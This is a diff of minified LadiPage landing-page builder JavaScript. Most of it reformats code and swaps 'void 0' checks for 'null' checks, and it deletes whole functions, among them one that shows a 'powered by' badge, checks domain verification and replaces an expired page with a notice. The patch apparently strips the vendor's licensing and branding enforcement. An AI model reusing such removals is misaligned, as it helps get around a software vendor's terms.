                 isEmptyLadiPage(v) || l.setAttribute('data-timeout-id-2', v),
                 l.style.removeProperty('visibility');
             };
-            if (t) A();
-            else {
-              (v = r.runTimeout(function () {
-                'none' == getComputedStyle(l).display
-                  ? ((s -= 100), A())
-                  : d(!0),
-                  l.removeAttribute('data-timeout-id-2');
-              }, 100)),
-                l.setAttribute('data-timeout-id-2', v);
-            }
-            l.removeAttribute('data-timeout-id-3');
+            t
+              ? A()
+              : ((v = r.runTimeout(function () {
+                  'none' == getComputedStyle(l).display
+                    ? ((s -= 100), A())
+                    : d(!0),
+                    l.removeAttribute('data-timeout-id-2');
+                }, 100)),
+                l.setAttribute('data-timeout-id-2', v)),
+              l.removeAttribute('data-timeout-id-3');
           },
           s = 0;
         i == r.const.POSITION_TYPE.default && (s = 100);
@@ -7350,13 +7348,12 @@ var LadiFormulaData = {},
       a < i.length;
       a++
     )
-      for (var n = 0; n < i[a].listRegex.length; n++) {
+      for (var n = 0; n < i[a].listRegex.length; n++)
         new RegExp(
           '^(' + i[a].listRegex[n].str_start + ')' + i[a].endStr + '$',
           'gi'
         ).test(t) &&
           (e = i[a].startStr + t.substring(i[a].listRegex[n].str_input.length));
-      }
     return e;
   }),
   (LadiPageScriptV2.prototype.runGlobalTrackingScript = function () {
@@ -7378,9 +7375,9 @@ var LadiFormulaData = {},
         }
   }),
   (LadiPageScriptV2.prototype.generateTrackingJS = function (t, e) {
-    (null != e && void 0 != e && 'object' == typeof e) || (e = {}),
+    (null != e && null != e && 'object' == typeof e) || (e = {}),
       (null != e.zalo_ads_pixel_ladipage_id &&
-        void 0 != e.zalo_ads_pixel_ladipage_id) ||
+        null != e.zalo_ads_pixel_ladipage_id) ||
         (e.zalo_ads_pixel_ladipage_id = '7056840457216708608'),
       !1 !== t.zalo_ads_pixel_ladipage &&
         0 == t.zalo_ads_pixel_ladipage &&
@@ -7390,7 +7387,7 @@ var LadiFormulaData = {},
       n = [];
     if (
       null != t.facebook_pixel &&
-      void 0 != t.facebook_pixel &&
+      null != t.facebook_pixel &&
       t.facebook_pixel.length > 0 &&
       (n = t.facebook_pixel.split(',').removeSpace()).length > 0
     ) {
@@ -7428,11 +7425,11 @@ var LadiFormulaData = {},
     var r = [],
       l = [];
     null != t.google_ads_id &&
-      void 0 != t.google_ads_id &&
+      null != t.google_ads_id &&
       t.google_ads_id.length > 0 &&
       (l = t.google_ads_id.split(',').removeSpace()),
       null != t.google_analytics_id &&
-        void 0 != t.google_analytics_id &&
+        null != t.google_analytics_id &&
         t.google_analytics_id.length > 0 &&
         (r = t.google_analytics_id.split(',').removeSpace()),
       (r.length > 0 || l.length > 0) &&
@@ -7455,7 +7452,7 @@ var LadiFormulaData = {},
     var d = [];
     if (
       null != t.tiktok_pixel &&
-      void 0 != t.tiktok_pixel &&
+      null != t.tiktok_pixel &&
       t.tiktok_pixel.length > 0
     ) {
       (d = t.tiktok_pixel.split(',').removeSpace()),
@@ -7482,7 +7479,7 @@ var LadiFormulaData = {},
     t.zalo_ads_pixel_ladipage &&
       (t.zalo_ads_pixel = e.zalo_ads_pixel_ladipage_id),
       null != t.zalo_ads_pixel &&
-        void 0 != t.zalo_ads_pixel &&
+        null != t.zalo_ads_pixel &&
         t.zalo_ads_pixel.length > 0 &&
         ((i +=
           '<script>!function(e,t,r,n,c){if(!e.ztrq){c=e.ztrq=function(){c.queue?c.queue.push(arguments): c.call(c,arguments)},e._ztrk||(e._ztrk=c),c.queue=[];var u=t.createElement(r);u.async=!0, u.src=n;var a=t.getElementsByTagName(r)[0];a.parentNode.insertBefore(u,a)}}(window,document,"script","https://s.zzcdn.me/ztr/ztracker.js?id=' +
@@ -7495,7 +7492,7 @@ var LadiFormulaData = {},
     var c = [];
     return (
       null != t.google_tag_manager_id &&
-        void 0 != t.google_tag_manager_id &&
+        null != t.google_tag_manager_id &&
         t.google_tag_manager_id.length > 0 &&
         ((c = t.google_tag_manager_id.split(',').removeSpace()).length > 0 &&
           ((i +=
@@ -7616,7 +7613,7 @@ var LadiFormulaData = {},
           (isObjectLadiPage(window.ladi_conversion_api) &&
             isObjectLadiPage(window.ladi_conversion_api.facebook) &&
             isArrayLadiPage(window.ladi_conversion_api.facebook.pixels))
-        ) {
+        )
           return {
             eventID:
               'ladi.' +
@@ -7624,7 +7621,6 @@ var LadiFormulaData = {},
               '.' +
               (Math.floor(9e10 * Math.random()) + 1e10),
           };
-        }
       };
       isNullLadiPage(o.runtime.tmp.ttq_click_button_tracking) &&
         (o.runtime.tmp.ttq_click_button_tracking = 0);
@@ -7681,21 +7677,18 @@ var LadiFormulaData = {},
           }
         },
         b = function (t) {
-          if (
-            t ||
+          return t ||
             (isObjectLadiPage(window.ladi_conversion_api) &&
               isObjectLadiPage(window.ladi_conversion_api.tiktok) &&
               isArrayLadiPage(window.ladi_conversion_api.tiktok.pixels))
-          ) {
-            return {
-              event_id:
-                'ladi.' +
-                Date.now() +
-                '.' +
-                (Math.floor(9e10 * Math.random()) + 1e10),
-            };
-          }
-          return {};
+            ? {
+                event_id:
+                  'ladi.' +
+                  Date.now() +
+                  '.' +
+                  (Math.floor(9e10 * Math.random()) + 1e10),
+              }
+            : {};
         },
         T = function (i, a) {
           if (P) {
@@ -7823,14 +7816,15 @@ var LadiFormulaData = {},
             },
           })
         );
-      if (isArrayLadiPage(e.data_event_run))
-        -1 !=
-          e.data_event_run.findIndex(function (t) {
-            return (
-              t.type == o.const.DATA_ACTION_TYPE.phone ||
-              t.type == o.const.DATA_ACTION_TYPE.email
-            );
-          }) &&
+      if (
+        (isArrayLadiPage(e.data_event_run) &&
+          -1 !=
+            e.data_event_run.findIndex(function (t) {
+              return (
+                t.type == o.const.DATA_ACTION_TYPE.phone ||
+                t.type == o.const.DATA_ACTION_TYPE.email
+              );
+            }) &&
           (isEmptyLadiPage(a) ||
             a.addEventListener('click', function (t) {
               (isFunctionLadiPage(n) && !n(a, t)) ||
@@ -7841,8 +7835,9 @@ var LadiFormulaData = {},
                   ttq_event_data: b(o.runtime.is_popupx),
                 }),
                 T(!0, { track_name: 'track', conversion_name: 'Contact' }));
-            }));
-      if (!isEmptyLadiPage(a)) {
+            })),
+        !isEmptyLadiPage(a))
+      ) {
         var S = !1;
         return (
           isEmptyLadiPage(l) || isEmptyLadiPage(d) || (S = !0),
@@ -8185,14 +8180,14 @@ var LadiFormulaData = {},
                 (!isEmptyLadiPage(i.address) &&
                   (function (e) {
                     var i = document.querySelector(
-                      '#' + t + ' .ladi-form-item [name="' + e + '"]'
+                      '#' + t + ' .ladi-form-item [name="address"]'
                     );
                     if (isEmptyLadiPage(i)) return !1;
                     var a = o.findAncestor(i, 'ladi-form-item');
                     return a.hasAttribute('ladi-checkbox-required')
                       ? 'true' == a.getAttribute('ladi-checkbox-required')
                       : !!i.required;
-                  })('address'))
+                  })())
                   ? T(!0, {
                       track_name: 'track',
                       conversion_name: 'Purchase',
@@ -8286,8 +8281,8 @@ var LadiFormulaData = {},
     return i && (o = isEmptyLadiPage(n[e]) ? o + ' ' + e : n[e].format(o)), o;
   }),
   (LadiPageScriptV2.prototype.formatNumber = function (t, e, i, a) {
-    if (void 0 != t) {
-      void 0 == i && (i = 0), void 0 == a && (a = 0);
+    if (null != t) {
+      null == i && (i = 0), null == a && (a = 0);
       var n = '\\d(?=(\\d{' + (e || 3) + '})+' + (a > 0 ? '\\.' : '$') + ')';
       t = t.toFixed(Math.max(0, ~~a)).replace(new RegExp(n, 'g'), '$&,');
       var o = null,
@@ -8350,9 +8345,8 @@ var LadiFormulaData = {},
           d = 0;
         d < t.childNodes.length;
         d++
-      ) {
+      )
         l(t.childNodes[d]);
-      }
     }
   }),
   (LadiPageScriptV2.prototype.convertDataReplaceStr = function (
@@ -8877,10 +8871,12 @@ var LadiFormulaData = {},
         var k = I[N].getAttribute(
           'data-replace-' + this.runtime.device + '-src'
         );
-        (k = this.convertDataReplaceStr(k, !0, null, !1, i)),
-          (k = decodeURIComponentLadiPage(k));
-        this.findAncestor(I[N], 'ladi-element');
-        if (isEmptyLadiPage(k))
+        if (
+          ((k = this.convertDataReplaceStr(k, !0, null, !1, i)),
+          (k = decodeURIComponentLadiPage(k)),
+          this.findAncestor(I[N], 'ladi-element'),
+          isEmptyLadiPage(k))
+        )
           I[N].style.setProperty('background-image', 'none');
         else {
           var x = this.findAncestor(I[N], 'ladi-element');
@@ -9080,11 +9076,14 @@ var LadiFormulaData = {},
   (LadiPageScriptV2.prototype.fireEvent = function (t, e, i) {
     t = isStringLadiPage(t) ? document.querySelector(t) : t;
     var a = document.createEvent('HTMLEvents');
-    (a.initEvent(e, !0, !0), isObjectLadiPage(i)) &&
-      Object.keys(i).forEach(function (t) {
-        a[t] = i[t];
-      });
-    return !t.dispatchEvent(a);
+    return (
+      a.initEvent(e, !0, !0),
+      isObjectLadiPage(i) &&
+        Object.keys(i).forEach(function (t) {
+          a[t] = i[t];
+        }),
+      !t.dispatchEvent(a)
+    );
   }),
   (LadiPageScriptV2.prototype.tapEventListener = function (t, e) {
     var i = this,
@@ -9149,14 +9148,14 @@ var LadiFormulaData = {},
   }),
   (LadiPageScriptV2.prototype.createTmpElement = function (t, e, i, a, n) {
     var o = null;
-    ((o =
+    (o =
       'svg' == t.toLowerCase()
         ? document.createElementNS('http://www.w3.org/2000/svg', t)
         : document.createElement(t)),
-    isEmptyLadiPage(i)) ||
-      Object.keys(i).forEach(function (t) {
-        o.setAttribute(t, i[t]);
-      });
+      isEmptyLadiPage(i) ||
+        Object.keys(i).forEach(function (t) {
+          o.setAttribute(t, i[t]);
+        });
     var r = document.createElement('div');
     return (
       r.appendChild(o),
@@ -9182,14 +9181,10 @@ var LadiFormulaData = {},
       r = Math.floor(a / 3600),
       l = Math.floor(n / 60),
       d = n % 60;
-    (o = o < 0 ? 0 : o),
-      (r = r < 0 ? 0 : r),
-      (l = l < 0 ? 0 : l),
-      (d = d < 0 ? 0 : d),
-      (o = o < 10 ? '0' + o : o),
-      (r = r < 10 ? '0' + r : r),
-      (l = l < 10 ? '0' + l : l),
-      (d = d < 10 ? '0' + d : d);
+    (o = (o = o < 0 ? 0 : o) < 10 ? '0' + o : o),
+      (r = (r = r < 0 ? 0 : r) < 10 ? '0' + r : r),
+      (l = (l = l < 0 ? 0 : l) < 10 ? '0' + l : l),
+      (d = (d = d < 0 ? 0 : d) < 10 ? '0' + d : d);
     var s = {};
     return (
       (s[this.const.COUNTDOWN_ITEM_TYPE.day] = o),
@@ -9248,14 +9243,16 @@ var LadiFormulaData = {},
   }),
   (LadiPageScriptV2.prototype.loadScript = function (t, e, i, a, n) {
     var o = document.createElement('script');
-    ((o.type = 'text/javascript'),
-    isFunctionLadiPage(i) && ((a = i), (i = e), (e = null)),
-    i && (o.async = !0),
-    isObjectLadiPage(e)) &&
-      Object.keys(e).forEach(function (t) {
-        'defer' == t || 'async' == t ? (o[t] = e[t]) : o.setAttribute(t, e[t]);
-      });
-    o.addEventListener('load', a),
+    (o.type = 'text/javascript'),
+      isFunctionLadiPage(i) && ((a = i), (i = e), (e = null)),
+      i && (o.async = !0),
+      isObjectLadiPage(e) &&
+        Object.keys(e).forEach(function (t) {
+          'defer' == t || 'async' == t
+            ? (o[t] = e[t])
+            : o.setAttribute(t, e[t]);
+        }),
+      o.addEventListener('load', a),
       (o.src = t),
       isObjectLadiPage(n) && n.hasOwnProperty('elm')
         ? n.elm.appendChild(o)
@@ -9263,11 +9260,13 @@ var LadiFormulaData = {},
   }),
   (LadiPageScriptV2.prototype.loadCss = function (t, e) {
     var i = document.createElement('link');
-    ((i.rel = 'stylesheet'), isObjectLadiPage(e)) &&
-      Object.keys(e).forEach(function (t) {
-        i.setAttribute(t, e[t]);
-      });
-    (i.href = t), document.head.appendChild(i);
+    (i.rel = 'stylesheet'),
+      isObjectLadiPage(e) &&
+        Object.keys(e).forEach(function (t) {
+          i.setAttribute(t, e[t]);
+        }),
+      (i.href = t),
+      document.head.appendChild(i);
   }),
   (LadiPageScriptV2.prototype.showLoadingBlur = function () {
     var t = this;
@@ -9311,11 +9310,13 @@ var LadiFormulaData = {},
   }),
   (LadiPageScriptV2.prototype.decodeValue = function (t) {
     var e = this;
-    isObjectLadiPage(t) &&
-      Object.keys(t).forEach(function (i) {
-        t[i] = e.decodeValue(t[i]);
-      });
-    if (isArrayLadiPage(t))
+    if (
+      (isObjectLadiPage(t) &&
+        Object.keys(t).forEach(function (i) {
+          t[i] = e.decodeValue(t[i]);
+        }),
+      isArrayLadiPage(t))
+    )
       for (var i = 0; i < t.length; i++) t[i] = e.decodeValue(t[i]);
     return isStringLadiPage(t) && (t = t.decode()), t;
   }),
@@ -9716,7 +9717,7 @@ var LadiFormulaData = {},
                       c = i.runTimeout(
                         function () {
                           i.showParentVisibility(r[0], function () {
-                            for (d = 0; d < r.length; d++) {
+                            for (d = 0; d < r.length; d++)
                               if (
                                 r[d].querySelectorAll(
                                   '.ladi-headline, .ladi-paragraph'
@@ -9734,7 +9735,6 @@ var LadiFormulaData = {},
                                   ),
                                   n(r[d], t));
                               }
-                            }
                           }),
                             i.runShowPopup(!0, e.id, null, null, !0, {
                               event: { target: t },
@@ -9744,12 +9744,11 @@ var LadiFormulaData = {},
                       );
                     };
                   i.showParentVisibility(r[0], function () {
-                    for (d = 0; d < r.length; d++) {
+                    for (d = 0; d < r.length; d++)
                       r[d].querySelectorAll('.ladi-headline, .ladi-paragraph')
                         .length > 0 &&
                         !r[d].hasAttribute('data-height') &&
                         r[d].setAttribute('data-height', r[d].clientHeight);
-                    }
                   });
                   var p = function (t) {
                       var e = i.runtime.eventData[t.id];
@@ -10565,55 +10564,6 @@ var LadiFormulaData = {},
             ((e = e || document.getElementById(t)),
             isEmptyLadiPage(e) || e.setAttribute('data-item-type', a));
         },
-        G = function () {
-          E.forEach(function (t) {
-            var e = document.getElementById(t);
-            if (
-              !isEmptyLadiPage(e) &&
-              'true' != e.getAttribute('data-action')
-            ) {
-              var a = i.runtime.eventData[t],
-                n = a['option.data_event'];
-              if (
-                !isArrayLadiPage(n) &&
-                ((n = []), isObjectLadiPage(a['option.data_action']))
-              ) {
-                var o = i.copy(a['option.data_action']);
-                (o.action_type = i.const.ACTION_TYPE.action), n.push(o);
-              }
-              !(function (t, e) {
-                e.forEach(function (e) {
-                  if (
-                    e.action_type == i.const.ACTION_TYPE.action &&
-                    e.type == i.const.DATA_ACTION_TYPE.link
-                  )
-                    if (isEmptyLadiPage(t.getAttribute('href')))
-                      t.removeAttribute('href');
-                    else {
-                      var a = i.getLinkUTMRedirect(t.href, null);
-                      t.setAttribute('data-replace-href', a),
-                        (t.href = i.convertDataReplaceStr(a, !0));
-                    }
-                });
-              })(e, n);
-            }
-          });
-          for (
-            var t = document.querySelectorAll(
-                '.ladi-headline a[href], .ladi-paragraph a[href], .ladi-list-paragraph a[href]'
-              ),
-              e = 0;
-            e < t.length;
-            e++
-          )
-            if (isEmptyLadiPage(t[e].getAttribute('href')))
-              t[e].removeAttribute('href');
-            else {
-              var a = i.getLinkUTMRedirect(t[e].href, null);
-              t[e].setAttribute('data-replace-href', a),
-                (t[e].href = i.convertDataReplaceStr(a, !0));
-            }
-        },
         W = function () {
           for (var t = 1e3, e = 0; e < LadiPageQueueCommandList.length; e++) {
             var a = LadiPageQueueCommandList[e];
@@ -10626,281 +10576,6 @@ var LadiFormulaData = {},
             }
           }
           i.runTimeout(W, t);
-        },
-        z = function () {
-          if (t) {
-            var e = function () {
-                if (
-                  ((i.runtime.ladipage_powered_by_classname = i.randomString(
-                    i.randomInt(6, 32)
-                  )),
-                  i.runtime.isClient)
-                ) {
-                  var t = document.createElement('div');
-                  document.body.insertBefore(
-                    t,
-                    document.body.childNodes[
-                      i.randomInt(0, document.body.childNodes.length)
-                    ]
-                  ),
-                    (t.className = i.runtime.ladipage_powered_by_classname);
-                  var e =
-                      '.' +
-                      i.runtime.ladipage_powered_by_classname +
-                      ' {width: 140px; height: 30px; position: fixed; bottom: -40px; left: 10px; z-index: 10000000000; background: url("' +
-                      i.const.POWERED_BY_IMAGE +
-                      '") no-repeat center #fafafa; background-size: 90% 70%; border-radius: 4px 4px 0 0; display: block; animation: ' +
-                      i.runtime.ladipage_powered_by_classname +
-                      ' 10s;} @keyframes ' +
-                      i.runtime.ladipage_powered_by_classname +
-                      ' {0% {bottom: -40px;} 10% {bottom: 0;} 90% {bottom: 0;} 100% {bottom: -40px;}}',
-                    a = document.createElement('style');
-                  (a.type = 'text/css'),
-                    document.head.insertBefore(
-                      a,
-                      document.head.childNodes[
-                        i.randomInt(0, document.head.childNodes.length)
-                      ]
-                    ),
-                    (a.innerHTML = e),
-                    i.runTimeout(function () {
-                      isEmptyLadiPage(t) || t.parentElement.removeChild(t),
-                        isEmptyLadiPage(a) || a.parentElement.removeChild(a);
-                    }, 1e4);
-                }
-              },
-              a = !1,
-              n = isArrayLadiPage(i.runtime.DOMAIN_FREE)
-                ? i.runtime.DOMAIN_FREE
-                : [],
-              o = window.location.href;
-            ['/', '.', '/'].forEach(function (t) {
-              for (; o.endsWith(t); ) o = o.substr(0, o.length - t.length);
-            });
-            var r = i.getElementAHref(o).host.toLowerCase();
-            n.forEach(function (t) {
-              a || (a = r.endsWith(t.toLowerCase()));
-            }),
-              a && i.runTimeout(e, 3e3),
-              B('PageView', {}, function (t, n) {
-                if ((-1 != t || a || i.runTimeout(e, 3e3), 200 == t)) {
-                  var o = JSON.parse(n),
-                    r = !1,
-                    l = null,
-                    d = null,
-                    s = !1;
-                  isObjectLadiPage(o.data)
-                    ? ((r = 1 == o.data.verified_domain),
-                      (l = o.data.google_captcha),
-                      (d = o.data.places_autocomplete),
-                      (s = o.data.is_expires))
-                    : (r = 1 == o.data),
-                    a || r || i.runTimeout(e, 3e3),
-                    isObjectLadiPage(l) &&
-                      (function (t, e, a) {
-                        if (!isEmptyLadiPage(t)) {
-                          var n = !1;
-                          a.type ==
-                            i.const.FORM_CONFIG_TYPE
-                              .google_recaptcha_enterprise && (e = !0),
-                            a.type ==
-                              i.const.FORM_CONFIG_TYPE
-                                .google_recaptcha_checkbox && (n = !0),
-                            (i.runtime.tmp.google_captcha = {
-                              api_key: t,
-                              enterprise: e,
-                              checkbox: n,
-                              type: a.type,
-                            }),
-                            (window.onloadRecaptchaCheckboxCallback =
-                              function () {
-                                for (
-                                  var e = function (e) {
-                                      var i = document.createElement('div');
-                                      (i.className =
-                                        'ladi-google-recaptcha-checkbox'),
-                                        e.insertBefore(i, a[n]);
-                                      var o = window.grecaptcha.render(i, {
-                                        sitekey: t,
-                                      });
-                                      i.setAttribute('data-widget-id', o);
-                                    },
-                                    a = document.querySelectorAll(
-                                      '.ladi-form .ladi-button'
-                                    ),
-                                    n = 0;
-                                  n < a.length;
-                                  n++
-                                ) {
-                                  var o = i.findAncestor(a[n], 'ladi-element'),
-                                    r = i.findAncestor(o, 'ladi-form');
-                                  if (!isEmptyLadiPage(r)) {
-                                    r = i.findAncestor(r, 'ladi-element');
-                                    var l = i.runtime.eventData[r.id];
-                                    if (!isEmptyLadiPage(l)) {
-                                      if (
-                                        l['option.is_form_login'] ||
-                                        l['option.is_form_otp'] ||
-                                        l['option.is_form_coupon'] ||
-                                        l['option.is_add_to_cart']
-                                      )
-                                        continue;
-                                      if (
-                                        isObjectLadiPage(
-                                          l['option.form_setting']
-                                        ) &&
-                                        l['option.form_setting'].is_multiple &&
-                                        !l['option.form_setting']
-                                          .is_multiple_otp
-                                      )
-                                        continue;
-                                    }
-                                  }
-                                  e(o);
-                                }
-                                for (
-                                  var d = document.querySelectorAll(
-                                      '#POPUP_CHECKOUT .ladi-button'
-                                    ),
-                                    s = 0;
-                                  s < d.length;
-                                  s++
-                                ) {
-                                  var c = i.findAncestor(d[s], 'ladi-element'),
-                                    u = i.runtime.eventData[c.id];
-                                  isEmptyLadiPage(u) ||
-                                    isEmptyLadiPage(
-                                      u['option.data_submit_form_id']
-                                    ) ||
-                                    !u['option.is_submit_form'] ||
-                                    e(c);
-                                }
-                              }),
-                            e
-                              ? i.loadScript(
-                                  'https://www.google.com/recaptcha/enterprise.js?render=' +
-                                    t +
-                                    '&hl=' +
-                                    i.runtime.lang
-                                )
-                              : n
-                              ? i.loadScript(
-                                  'https://www.google.com/recaptcha/api.js?onload=onloadRecaptchaCheckboxCallback&render=explicit&hl=' +
-                                    i.runtime.lang
-                                )
-                              : i.loadScript(
-                                  'https://www.google.com/recaptcha/api.js?render=' +
-                                    t
-                                );
-                        }
-                      })(l.site_key, l.enterprise, l),
-                    isObjectLadiPage(d) &&
-                      ((c = d.api_key),
-                      isEmptyLadiPage(c) ||
-                        ((window.onloadGooglePlacesAutocompleteCallback =
-                          function () {
-                            var t = document.querySelectorAll(
-                                '[data-places-autocomplete-country]'
-                              ),
-                              e = null,
-                              i = 0,
-                              a = {},
-                              n = function (n) {
-                                for (i = 0; i < t.length; i++)
-                                  (e = t[i].querySelector(
-                                    'input[name="address"]'
-                                  )).removeAttribute('data-focus');
-                                (e = n.target).setAttribute('data-focus', !0),
-                                  (a = e.getAttribute('data-attrs')),
-                                  isEmptyLadiPage(a) &&
-                                    (((a = {
-                                      style: e.getAttribute('style'),
-                                      placeholder:
-                                        e.getAttribute('placeholder'),
-                                      disabled: e.disabled,
-                                    }).style = isEmptyLadiPage(a.style)
-                                      ? ''
-                                      : a.style),
-                                    (a.placeholder = isEmptyLadiPage(
-                                      a.placeholder
-                                    )
-                                      ? ''
-                                      : a.placeholder),
-                                    (a.disabled =
-                                      !isNullLadiPage(a.disabled) &&
-                                      a.disabled),
-                                    e.setAttribute(
-                                      'data-attrs',
-                                      encodeURIComponent(JSON.stringify(a))
-                                    ));
-                              };
-                            for (i = 0; i < t.length; i++) {
-                              var o = t[i].getAttribute(
-                                  'data-places-autocomplete-country'
-                                ),
-                                r = { types: ['address'] };
-                              (o = isEmptyLadiPage(o)
-                                ? []
-                                : (o = (o =
-                                    o.split(',')).removeSpace()).unique())
-                                .length > 0 &&
-                                (r.componentRestrictions = { country: o }),
-                                (e = t[i].querySelector(
-                                  'input[name="address"]'
-                                )).addEventListener('focus', n),
-                                new google.maps.places.Autocomplete(e, r);
-                            }
-                            t.length > 0 &&
-                              (window.gm_authFailure = function () {
-                                for (i = 0; i < t.length; i++)
-                                  (e = t[i].querySelector(
-                                    'input[name="address"]'
-                                  )),
-                                    (a = e.getAttribute('data-attrs')),
-                                    (a = isEmptyLadiPage(a)
-                                      ? {
-                                          style: '',
-                                          placeholder: '',
-                                          disabled: !1,
-                                        }
-                                      : JSON.parse(
-                                          decodeURIComponentLadiPage(a)
-                                        )),
-                                    e.setAttribute('style', a.style),
-                                    e.setAttribute(
-                                      'placeholder',
-                                      a.placeholder
-                                    ),
-                                    (e.disabled = a.disabled),
-                                    'true' == e.getAttribute('data-focus') &&
-                                      e.focus();
-                              });
-                          }),
-                        i.loadScript(
-                          'https://maps.googleapis.com/maps/api/js?key=' +
-                            c +
-                            '&libraries=places&callback=onloadGooglePlacesAutocompleteCallback'
-                        ))),
-                    s &&
-                      (function () {
-                        if (!window.next && !isEmptyLadiPage(T)) {
-                          var t = i.const.LANG.EXPIRES_TITLE,
-                            e = i.const.LANG.EXPIRES_DESC;
-                          i.showMessage(
-                            `\n            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet" type="text/css">\n            <style>\n                .ladipage-message-box > span, .ladipage-message-close {display: none !important;}\n                .ladipage-message-box {border:none; border-radius: 20px; background: linear-gradient(59deg, #5036DA 27.6%, #9382F0 129.38%); width: 480px !important; height: auto !important; font-family: 'Roboto';}\n                .ladipage-message-box .ladipage-message-text {display: flex !important; justify-content: center; align-items: center; flex-flow: column; margin-top: 0 !important; padding: 48px 24px 12px !important; text-align: center;}\n                .ladipage-message-box img {width: 120px; height: 120px;}\n                .ladipage-message-box h3 {font-size: 24px; position: relative; text-transform: uppercase; font-weight: 500; line-height: 26px; margin-top: 12px; color: #fff;}\n                .ladipage-message-box h3:before {content: ""; background: #D3C9FB; width: 90%; height: 2px; position: absolute; bottom: -8px; left: 0; right: 0; margin: auto;}\n                .ladipage-message-box p {font-size: 16px; margin-top: 24px; font-weight: 400; line-height: 20px; color: #fff;}\n                .ladipage-message-box a {width: 117px; height: 20px; background-color: #fff; --url: url("./w.ladicdn.com/ladiui/icons/ldicon-brand-powered-ladipage.svg"); margin-top: 40px; mask: var(--url); -webkit-mask: var(--url);}\n            </style>\n            <img src="./w.ladicdn.com/ladiui/icons/expired-landing-page.svg" />\n            <h3>${t}</h3>\n            <p>${e}</p>\n            <a></a>\n        `
-                          ),
-                            (window.LadiPageScript = null),
-                            (window.LadiPageScriptV2 = null),
-                            (window.ladi = null),
-                            (window.LadiPageLibraryV2 = null),
-                            (window.isNullLadiPage = null),
-                            (window.isEmptyLadiPage = null);
-                        }
-                      })();
-                }
-                var c;
-              });
-          }
         },
         X = function (t, e, a, n) {
           if (
@@ -11267,12 +10942,11 @@ var LadiFormulaData = {},
           var a = i.runtime.eventData[t];
           if ('gallery' == a.type) {
             var n = e.getAttribute('data-runtime-id');
-            if (!e.hasAttribute('data-scrolled')) {
-              e.setAttribute('data-scrolled', !1);
-              i.runtime.list_scroll_func[n] = function () {
+            e.hasAttribute('data-scrolled') ||
+              (e.setAttribute('data-scrolled', !1),
+              (i.runtime.list_scroll_func[n] = function () {
                 e.setAttribute('data-scrolled', !0);
-              };
-            }
+              }));
             var o = a[i.runtime.device + '.option.gallery_control.autoplay'],
               r = a[i.runtime.device + '.option.gallery_control.autoplay_time'],
               l = 0;
@@ -11919,17 +11593,16 @@ var LadiFormulaData = {},
               (e = t.classList.contains('no-value')
                 ? null
                 : t.getAttribute('data-value')),
-            (e = isEmptyLadiPage(e) ? '' : e)
+            isEmptyLadiPage(e) ? '' : e
           );
         },
         nt = function (t, e) {
           var i = t.querySelectorAll('.ladi-form-label-item');
           e = isEmptyLadiPage(e) ? '' : e;
-          for (var a = 0; a < i.length; a++) {
+          for (var a = 0; a < i.length; a++)
             at(i[a]) == e
               ? i[a].classList.add('selected')
               : i[a].classList.remove('selected');
-          }
         },
         ot = function (t) {
           var e = t.querySelector('.ladi-form-label-item.selected');
@@ -12363,7 +12036,7 @@ var LadiFormulaData = {},
                 t
               )),
                 (A = 'style_add_to_cart_image_' + e);
-              var w = '';
+              var w;
               (w = isEmptyLadiPage(b)
                 ? '#' +
                   e +
@@ -12607,132 +12280,6 @@ var LadiFormulaData = {},
                 (v[h].addEventListener('change', y),
                 v[h].addEventListener('input', y));
         },
-        ut = function () {
-          for (
-            var t = document.getElementById(i.runtime.backdrop_dropbox_id),
-              e = 0,
-              a = function (e) {
-                e.stopPropagation();
-                var a = i.findAncestor(e.target, 'ladi-element'),
-                  n = document.querySelector(
-                    '#' +
-                      i.runtime.builder_section_popup_id +
-                      ' > .ladi-container > #' +
-                      i.runtime.builder_popup_menu_mobile_id +
-                      '_' +
-                      a.id
-                  );
-                if (!isEmptyLadiPage(n)) {
-                  n.setAttribute('data-menu-id', a.id),
-                    n.classList.add('popup-menu-mobile');
-                  var o = n.getElementsByClassName('popup-close')[0];
-                  isEmptyLadiPage(o) &&
-                    (((o = document.createElement('div')).className =
-                      'popup-close'),
-                    o.addEventListener('click', function (e) {
-                      e.stopPropagation(), i.fireEvent(t, 'click');
-                    }),
-                    n.appendChild(o)),
-                    window.ladi(n.id, n).showDropbox(document.body);
-                }
-              },
-              n = function (t) {
-                if (t.hasAttribute('data-item'))
-                  return t.getAttribute('data-item');
-                var e = t.getElementsByTagName('a')[0];
-                return isEmptyLadiPage(e)
-                  ? void 0
-                  : e.getAttribute('data-item');
-              },
-              o = function (t) {
-                isObjectLadiPage(i.runtime.tmp.menu_item_event) ||
-                  (i.runtime.tmp.menu_item_event = {});
-                var a = String(++e);
-                (i.runtime.tmp.menu_item_event[a] = n(t)),
-                  (function (t, e) {
-                    var i = t.getElementsByTagName('a')[0];
-                    isEmptyLadiPage(i)
-                      ? t.setAttribute('data-item', e)
-                      : i.setAttribute('data-item', e);
-                  })(t, a);
-              },
-              r = function (e) {
-                e.stopPropagation();
-                var a = i.findAncestor(e.target, 'ladi-menu-item');
-                if ('true' != a.getAttribute('data-child')) {
-                  var o = null;
-                  try {
-                    (o = decodeURIComponentLadiPage(
-                      i.runtime.tmp.menu_item_event[n(a)]
-                    )),
-                      (o = JSON.parse(o));
-                  } catch (t) {}
-                  isObjectLadiPage(o) &&
-                    !isEmptyLadiPage(o.type) &&
-                    i.fireEvent(t, 'click');
-                }
-              },
-              l = function (t) {
-                t.stopPropagation();
-                var e = i.findAncestor(t.target, 'ladi-menu-item');
-                if ('true' == e.getAttribute('data-child')) {
-                  e.classList.toggle('open');
-                  var a = i.findAncestor(e, 'popup-menu-mobile');
-                  if (!isEmptyLadiPage(a)) return;
-                }
-                var o = null;
-                try {
-                  (o = decodeURIComponentLadiPage(
-                    i.runtime.tmp.menu_item_event[n(e)]
-                  )),
-                    (o = JSON.parse(o));
-                } catch (t) {}
-                if ('true' == e.getAttribute('data-child')) {
-                  var r = (function (t, e) {
-                    if (t.hasAttribute(e)) return t;
-                    var i = t.getElementsByTagName('a')[0];
-                    return !isEmptyLadiPage(i) && i.hasAttribute(e)
-                      ? i
-                      : void 0;
-                  })(e, 'href');
-                  isEmptyLadiPage(r) || r.click();
-                }
-                if (isObjectLadiPage(o)) {
-                  o.action_type = i.const.ACTION_TYPE.action;
-                  var l = i.findAncestor(e, 'ladi-element');
-                  i.runtime.tmp.runDataEventNow(l, [o], o);
-                }
-              },
-              d = document.querySelectorAll(
-                '.ladi-element .ladi-menu.menu-icon-item'
-              ),
-              s = 0;
-            s < d.length;
-            s++
-          )
